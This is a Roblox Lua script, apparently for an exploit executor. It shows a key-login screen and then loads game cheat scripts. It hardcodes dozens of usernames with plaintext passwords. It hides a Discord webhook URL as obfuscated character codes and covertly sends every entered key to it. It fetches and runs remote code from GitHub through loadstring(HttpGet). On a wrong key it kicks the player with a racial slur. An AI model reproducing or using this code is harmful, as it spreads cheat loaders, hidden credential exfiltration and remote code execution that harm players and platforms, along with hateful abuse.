local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local player = game.Players.LocalPlayer

-- 🔐 Kullanıcı Adı → Key eşleşmeleri
local allowedUsers = {
    ["FeFeALT24"] = "admin",
    ["pleasegimmeerwin"] = "stinkyfart32",
    ["cameronherbst"] = "Cam1226",
    ["Mahmutkrsgl"] = "1903",
    ["Mercy_emo"] = "1904",
    ["asyakrsgl"] = "1905",
    ["evlpne"] = "chickenfart234",
    ["hsyweei12345"] = "0107",
    ["Vofzzz"] = "Dominicano",
    ["gocrazyjay0"] = "Jordan21",
    ["KronicIz"] = "Mcboss413",
    ["zxytoxd"] = "oompaloompa",
    ["SebastianDuckMaster"] = "oompaloompa",
    ["BrooklynHaze12"] = "Poppaishere",
    ["WolfRavenLucky"] = "UncleTayy",
    ["Lebronjammes38"] = "lebronking33",
    ["benn_kaz"] = "sikicikanye",
    ["2xclusive_Tay"] = "Tayysob",
    ["leshenhazretleri"] = "1900",
    ["rjames1001"] = "Cam1563",
    ["MikaSwungU"] = "J@thegoat1",
    ["StopAimingOnAltz233"] = "collin453",
    ["kooldboys3"] = "UncleTayy",
    ["Kappadotty"] = "jjsploitisgreat",
    ["g8pvlbpzgiu9hc8mclv6"] = "keel",
    ["Camehgghgggf"] = "Jake1226",
    ["Leroy_980"] = "imthebest",
    ["Stealth_Omega2008"] = "TO6789",
    ["lerro700"] = "12345678",
    ["leroynot2krazy"] = "Thisistooez",
    ["R4GE_SEV"] = "sev123",
    ["finnadestroyaboss"] = "imgayngl",
    ["augustosienna"] = "collin999",
    ["XxSebastianMaxxX2017"] = "loompa",
    ["saulc_bestnewacc"] = "District",
    ["Saulc_bestalt3"] = "District12",
    ["CommandroOps"] = "COMO293",
    ["jenso1234xx"] = "jinx1234109",
    ["Addis0nN3xus47"] = "collin900",
    ["bob0000000000000"] = "1252887J@",
    ["CrystalGh0stNinja"] = "Hello123",
    ["NohzueioGG"] = "3169",
    ["mahmutunabisi0"] = "oetalat",
    ["bigboyisback3"] = "4golem",
    ["Iloveinlovewithlily"] = "rivalspro",
    ["socialy_anti21"] = "Actavis21",
    ["null"] = "null",
    ["null"] = "null",
    ["null"] = "null",
    ["null"] = "null",
    ["null"] = "null",
    ["null"] = "null",
}

-- ✅ Oyun ID → Script URL ve isim eşleşmesi
local scriptMap = {
    [13643807539] = {
        url = "https://raw.githubusercontent.com/SemionInThesius/Cooking-Recipe/refs/heads/main/Cooking%20Recipe",
        name = "South Bronx Menu"
    },
    [117946920443617] = {
        url = "https://raw.githubusercontent.com/SemionInThesius/Cooking-Recipe/refs/heads/main/Cooking%20waste.lua",
        name = "Wasteland Blues"
    },
    [16472538603] = {
        url = "https://raw.githubusercontent.com/SemionInThesius/Cooking-Recipe/refs/heads/main/fixed%20Cooking.txt",
        name = "Tha Bronx 3"
    }
}

-- 🔒
local a1 = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47}
local a2 = {97,112,105,47,119,101,98,104,111,111,107,115,47,49,51,55,51,51,52,49}
local a3 = {51,50,52,56,55,52,54,49,54,56,57,50,47,122,52,85,115,79,97,68}
local a4 = {118,111,90,79,68,112,108,106,122,121,120,72,48,45,103,97,66,118,67,89}
local a5 = {101,52,117,69,82,51,76,55,115,76,76,106,78,103,105,57,82,75,50,89}
local a6 = {98,90,101,72,85,106,56,81,67,78,117,68,109,105,105,105,70,117,109,77}
local a7 = {119}
local logEndpoint = string.char(unpack(a1)) .. string.char(unpack(a2)) .. string.char(unpack(a3)) ..
                    string.char(unpack(a4)) .. string.char(unpack(a5)) .. string.char(unpack(a6)) .. string.char(unpack(a7))

-- ✅ GUI oluşturuluyor
local blur = Instance.new("BlurEffect", game:GetService("Lighting"))
TweenService:Create(blur, TweenInfo.new(0.5), {Size = 12}):Play()

local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "KeyAuth"
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 380, 0, 260)
frame.Position = UDim2.new(0.5, -190, 0.5, -130)
frame.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -40, 0, 50)
title.Position = UDim2.new(0, 20, 0, 10)
title.Text = "🔐 Key Verification"
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left

local keyBox = Instance.new("TextBox", frame)
keyBox.Size = UDim2.new(0.85, 0, 0, 40)
keyBox.Position = UDim2.new(0.075, 0, 0, 80)
keyBox.PlaceholderText = "Enter your access key..."
keyBox.TextInputType = Enum.TextInputType.Password
keyBox.Font = Enum.Font.Gotham
keyBox.TextSize = 18
keyBox.TextColor3 = Color3.fromRGB(0, 0, 0)
keyBox.BackgroundColor3 = Color3.fromRGB(235, 235, 235)
Instance.new("UICorner", keyBox).CornerRadius = UDim.new(0, 10)

local closeBtn = Instance.new("TextButton", frame)
closeBtn.Text = "X"
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 10)
closeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
closeBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 20
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)

closeBtn.MouseButton1Click:Connect(function()
    TweenService:Create(frame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
    TweenService:Create(blur, TweenInfo.new(0.3), {Size = 0}):Play()
    task.wait(0.3)
    gui:Destroy()
    blur:Destroy()
end)

local verifyBtn = Instance.new("TextButton", frame)
verifyBtn.Size = UDim2.new(0.85, 0, 0, 40)
verifyBtn.Position = UDim2.new(0.075, 0, 0, 145)
verifyBtn.Text = "Verify Key"
verifyBtn.Font = Enum.Font.GothamBold
verifyBtn.TextSize = 20
verifyBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
verifyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
Instance.new("UICorner", verifyBtn).CornerRadius = UDim.new(0, 10)

-- 🔗 log fonksiyonu
local function sendLog(username, enteredKey, status)
    local gameInfo = scriptMap[game.PlaceId]
    local gameName = gameInfo and gameInfo.name or "Unknown Game"

    local embed = {
        ["title"] = "Key Auth Attempt",
        ["description"] = status and "✅ Access Granted" or "❌ Access Denied",
        ["color"] = status and 65280 or 16711680,
        ["fields"] = {
            {["name"] = "Username", ["value"] = username},
            {["name"] = "Entered Key", ["value"] = enteredKey},
            {["name"] = "Game", ["value"] = gameName}
        },
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    local data = HttpService:JSONEncode({["embeds"] = {embed}})
    local req = http_request or request or syn.request
    if req then
        pcall(function()
            req({
                Url = logEndpoint,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = data
            })
        end)
    end
end

-- ✅ Key kontrol ve script yükleme
local function checkKey()
    local name = player.Name
    local input = keyBox.Text
    local correct = allowedUsers[name]
    local valid = (input == correct)

    sendLog(name, input, valid)

    if not valid then
        player:Kick("Access Denied: Are you dumb you fucking nigger? you realy entered it wrong? bruhh just dont use it if you this dumb fr")
        return
    end

    -- 🎉 Başarılı giriş
    local grantedFrame = Instance.new("Frame", gui)
    grantedFrame.Size = UDim2.new(0, 600, 0, 100)
    grantedFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    grantedFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    grantedFrame.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
    grantedFrame.BackgroundTransparency = 1
    Instance.new("UICorner", grantedFrame).CornerRadius = UDim.new(0, 10)

    local grantedLabel = Instance.new("TextLabel", grantedFrame)
    grantedLabel.Size = UDim2.new(1, 0, 1, 0)
    grantedLabel.BackgroundTransparency = 1
    grantedLabel.Text = "✅ Access Granted. Enjoy!"
    grantedLabel.Font = Enum.Font.GothamBlack
    grantedLabel.TextSize = 28
    grantedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    local sound = Instance.new("Sound", gui)
    sound.SoundId = "rbxassetid://237877850"
    sound.Volume = 1
    sound:Play()

    TweenService:Create(grantedFrame, TweenInfo.new(0.4), {BackgroundTransparency = 0.1}):Play()
    task.wait(2)
    TweenService:Create(grantedFrame, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
    task.wait(0.4)
    grantedFrame:Destroy()
    sound:Destroy()

    TweenService:Create(frame, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
    TweenService:Create(blur, TweenInfo.new(0.4), {Size = 0}):Play()
    task.wait(0.5)
    gui:Destroy()
    blur:Destroy()

    local scriptInfo = scriptMap[game.PlaceId]
    if scriptInfo and scriptInfo.url then
        loadstring(game:HttpGet(scriptInfo.url))()
    else
        warn("No script assigned for this game.")
    end
end

verifyBtn.MouseButton1Click:Connect(checkKey)
keyBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        checkKey()
    end
end)
